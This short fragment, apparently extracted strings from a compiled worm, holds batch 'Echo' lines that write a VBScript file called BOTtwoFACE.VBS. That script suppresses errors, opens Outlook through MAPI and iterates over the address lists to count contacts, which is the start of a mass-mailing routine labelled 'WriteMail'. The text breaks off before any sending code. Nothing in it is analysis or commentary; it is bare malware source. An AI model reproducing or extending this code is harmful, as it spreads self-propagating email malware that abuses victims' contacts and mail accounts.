WriteMail
J,Echo On Error Resume Next > \BOTtwoFACE.VBS
J(Echo Function Mail() >> \BOTtwoFACE.VBS
JDEcho Set C = CreateObject("Outlook.Application") >> \BOTtwoFACE.VBS
J7Echo Set D = C.GetNameSpace("MAPI") >> \BOTtwoFACE.VBS
J/Echo Set E = D.AddressLists >> \BOTtwoFACE.VBS
J(Echo For Each F In E >> \BOTtwoFACE.VBS
J<Echo If F.AddressEntries.Count <> 0 Then >> \BOTtwoFACE.VBS
J3Echo G = F.AddressEntries.Count >> \BOTtwoFACE.VBS
